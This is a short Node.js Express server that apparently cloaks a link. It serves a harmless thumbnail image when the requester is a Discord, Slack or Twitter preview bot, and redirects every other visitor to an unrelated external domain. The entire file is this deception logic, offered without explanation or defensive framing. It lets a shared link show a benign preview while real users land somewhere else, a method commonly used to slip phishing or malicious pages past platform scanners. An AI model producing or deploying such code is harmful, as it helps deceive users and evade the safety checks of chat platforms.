import express from "express";
import fetch from "node-fetch";
const app = express();
app.get("/image", async (req, res) => {
  const ua = req.get("User-Agent") || "";
  if (ua.includes("Discordbot") || ua.includes("Slack") || ua.includes("Twitterbot")) {
    const imageUrl = "https://th.bing.com/th/id/OIP.FJTHqgfxCPZrWycwCcdU3QAAAA?w=230&h=203&c=7&o=5&cb=ucfimgc2&pid=1.20";
    const response = await fetch(imageUrl);
    const buffer = await response.arrayBuffer();

    res.set("Content-Type", "image/jpeg");
    res.send(Buffer.from(buffer));
  }

  else {
    res.redirect("http://browth.o-r.kr");
  }
});

app.listen(3000, () => {
  console.log("서버 실행 중: http://localhost:3000/image");
});
